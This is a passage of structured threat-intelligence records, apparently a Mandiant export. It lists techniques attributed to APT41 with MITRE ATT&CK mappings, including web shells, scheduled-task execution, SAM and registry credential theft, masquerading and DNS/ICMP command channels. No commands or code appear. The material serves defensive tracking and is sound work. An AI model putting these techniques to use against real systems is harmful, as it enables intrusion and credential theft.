'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb', 'name': 'Server Software Component', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1505', 'tactics': ['Persistence']}, {'type': 'attack-pattern', 'id': 'attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb', 'name': 'Web Shell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1505.003', 'tactics': ['Persistence']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-05-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--97660fac-6d79-5269-a483-865d64b17dc3', 'name': 'Lateral Movement', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-06-14T00:00:00.000Z', 'last_observed': '2021-10-17T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--bc3353ee-fcba-57d9-be75-c30689482878', 'name': 'Arbitrary command execution with schtasks', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9', 'name': 'Scheduled Task', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1053.005', 'tactics': ['Privilege Escalation', 'Persistence', 'Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9', 'name': 'Scheduled Task/Job', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1053', 'tactics': ['Privilege Escalation', 'Persistence', 'Execution']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-12-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--0388b26c-775a-525f-96e8-3df1a90288d3', 'name': 'Process Enumeration', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580', 'name': 'Process Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1057', 'tactics': ['Discovery']}, {'type': 'attack-pattern', 'id': 'attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58', 'name': 'Software Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1518', 'tactics': ['Discovery']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-05-09T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--5bbdf932-85bc-5c16-a073-d47a740a96b7', 'name': 'Datamine credentials stored by Windows registry.', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517', 'name': 'Unsecured Credentials', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1552', 'tactics': ['Credential Access']}, {'type': 'attack-pattern', 'id': 'attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580', 'name': 'Credentials in Registry', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1552.002', 'tactics': ['Credential Access']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-10-17T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--9927c76d-8f05-5c93-8831-a3db2144272f', 'name': 'Arbitrary script execution using cscript.exe', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830', 'name': 'Command and Scripting Interpreter', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059', 'tactics': ['Execution']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-05-09T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--5cf1d2a8-0d62-563e-a50d-14bf6a32e73a', 'name': 'NTFS Alternate Data Streams', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5', 'name': 'NTFS File Attributes', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1564.004', 'tactics': ['Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8', 'name': 'Hide Artifacts', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1564', 'tactics': ['Defense Evasion']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-14T00:00:00.000Z', 'last_observed': '2021-05-14T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--2b4d5f0a-908f-5533-9952-17b6f15affb6', 'name': 'Use of SSL', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'name': 'Install Digital Certificate', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1608.003', 'tactics': ['Resource Development']}, {'type': 'attack-pattern', 'id': 'attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada', 'name': 'Asymmetric Cryptography', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1573.002', 'tactics': ['Command and Control']}, {'type': 'attack-pattern', 'id': 'attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118', 'name': 'Encrypted Channel', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1573', 'tactics': ['Command and Control']}, {'type': 'attack-pattern', 'name': 'Stage Capabilities', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1608', 'tactics': ['Resource Development']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-02T00:00:00.000Z', 'last_observed': '2021-05-02T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--9d057cab-b6da-5c00-abbc-985367a6cdc5', 'name': 'Remote System Discovery', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735', 'name': 'Remote System Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1018', 'tactics': ['Discovery']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-01T00:00:00.000Z', 'last_observed': '2021-05-01T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--8cfb0bea-cc62-5e0b-ba74-c6b312ec1749', 'name': 'Compressed with 7-Zip', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662', 'name': 'Archive via Utility', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1560.001', 'tactics': ['Collection']}, {'type': 'attack-pattern', 'id': 'attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a', 'name': 'Archive Collected Data', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1560', 'tactics': ['Collection']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-23T00:00:00.000Z', 'last_observed': '2021-05-23T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--9f8eb3dc-1e05-542a-90e1-f0706fb07236', 'name': 'Viewing a file', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2020-06-15T00:00:00.000Z', 'last_observed': '2020-06-16T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--657334e9-ebf3-5dfa-b21d-dae05a8b5370', 'name': 'Datamine Active Directory Trusts', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0', 'name': 'Domain Trust Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1482', 'tactics': ['Discovery']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-05-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--aaa71b54-2de3-56f8-a4b9-49619aaa6686', 'name': 'Local Staging Directory', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e', 'name': 'Data Staged', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074', 'tactics': ['Collection']}, {'type': 'attack-pattern', 'id': 'attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c', 'name': 'Local Data Staging', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074.001', 'tactics': ['Collection']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-05-06T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--1db022eb-6865-5310-bc8b-abd9a44dd9c0', 'name': 'Copying a file', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-06-14T00:00:00.000Z', 'last_observed': '2021-06-14T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--78b289c3-f158-5d72-8dd5-55197fb784b2', 'name': 'Arbitrary payload execution using cmd.exe', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830', 'name': 'Command and Scripting Interpreter', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059', 'tactics': ['Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62', 'name': 'Windows Command Shell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059.003', 'tactics': ['Execution']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-01T00:00:00.000Z', 'last_observed': '2021-12-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--225718db-bc23-5d71-8909-0f487534cce1', 'name': 'Deleting a file', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69', 'name': 'Indicator Removal', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1070', 'tactics': ['Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c', 'name': 'File Deletion', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1070.004', 'tactics': ['Defense Evasion']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-09T00:00:00.000Z', 'last_observed': '2021-05-09T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--3dd7ce5c-c319-5586-8f1d-0d8e58f0b45b', 'name': 'Host Search', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-06-14T00:00:00.000Z', 'last_observed': '2021-06-14T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--c5ecdc1a-7976-5cb8-84a1-387fda9ac3c9', 'name': 'Use of ICMP', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b', 'name': 'Non-Application Layer Protocol', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1095', 'tactics': ['Command and Control']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-06-14T00:00:00.000Z', 'last_observed': '2021-07-04T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--59d2e23c-a76b-573a-bd0f-f57097dc368f', 'name': 'Use of DNS', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6', 'name': 'Application Layer Protocol', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071', 'tactics': ['Command and Control']}, {'type': 'attack-pattern', 'id': 'attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72', 'name': 'DNS', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071.004', 'tactics': ['Command and Control']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-23T00:00:00.000Z', 'last_observed': '2021-12-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--75ba9f27-fff1-57ed-83d2-f80d4c9827fb', 'name': 'Datamine Windows registry', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896', 'name': 'Query Registry', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1012', 'tactics': ['Discovery']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-10-17T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--53eed210-aad4-5284-8687-d136f5c33002', 'name': 'Datamine network configuration or status', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0', 'name': 'System Network Configuration Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1016', 'tactics': ['Discovery']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2020-06-15T00:00:00.000Z', 'last_observed': '2022-02-26T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--78fc9e88-2580-5808-83af-e81b24db98bb', 'name': 'Credential theft from Security Accounts Manager (SAM) database', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011', 'name': 'Security Account Manager', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1003.002', 'tactics': ['Credential Access']}, {'type': 'attack-pattern', 'id': 'attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22', 'name': 'OS Credential Dumping', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1003', 'tactics': ['Credential Access']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-10-17T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--59d8f4a8-a6c6-5d9b-9d86-19f0616b54ff', 'name': 'Mimics a legitimate file name', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0', 'name': 'Masquerading', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1036', 'tactics': ['Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2', 'name': 'Match Legitimate Name or Location', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1036.005', 'tactics': ['Defense Evasion']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-10-17T00:00:00.000Z', 'last_observed': '2021-10-17T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--47f3990d-333d-5a1d-9362-e57f619c6223', 'name': 'File Masquerades', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0', 'name': 'Masquerading', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1036', 'tactics': ['Defense Evasion']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-23T00:00:00.000Z', 'last_observed': '2021-05-23T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--42d4b769-2156-5559-8b39-a0805b15c404', 'name': 'Datamine Active Directory data', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-06-14T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--c313aed3-7079-566d-bd27-d9a6260082c7', 'name': 'Use of SQL Injection', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c', 'name': 'Exploit Public-Facing Application', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1190', 'tactics': ['Initial Access']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2022-02-26T00:00:00.000Z', 'last_observed': '2022-02-26T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--21073825-af1e-5d63-81b1-f5912d3144b0', 'name': 'Arbitrary command execution with a scheduled task', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9', 'name': 'Scheduled Task/Job', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1053', 'tactics': ['Privilege Escalation', 'Persistence', 'Execution']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-05T00:00:00.000Z', 'last_observed': '2021-05-15T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--d548d0fc-43c6-5a4a-8a23-ef0e3c04dac6', 'name': 'Local Account Enumeration', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08', 'name': 'Account Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1087', 'tactics': ['Discovery']}, {'type': 'attack-pattern', 'id': 'attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e', 'name': 'Local Account', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1087.001', 'tactics': ['Discovery']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-12-05T00:00:00.000Z', 'last_observed': '2021-12-05T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--8ad35589-cc97-5f57-8800-bbcae41f5ef1', 'name': 'Service Start', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253', 'name': 'System Services', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1569', 'tactics': ['Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4', 'name': 'Service Execution', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1569.002', 'tactics': ['Execution']}], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-05-01T00:00:00.000Z', 'last_observed': '2021-05-01T00:00:00.000Z'}]},<br/>{'name': 'Technique Observed', 'description': 'Mandiant Observed Use of The Technique', 'releasable': True, 'event_type': 'technique_observed', 'mandiant_technique': {'type': 'attack-pattern', 'id': 'attack-pattern--e1f4a21b-4d2f-5096-aa85-6fed53cc061c', 'name': 'Creating a file', 'attribution_scope': 'confirmed', 'releasable': True}, 'mitre_techniques': [], 'used_by': [{'releasable': True, 'actor': {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}, 'first_observed': '2021-06-14T00:00:00.000Z', 'last_observed': '2022-02-26T00:00:00.000Z'}]},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': 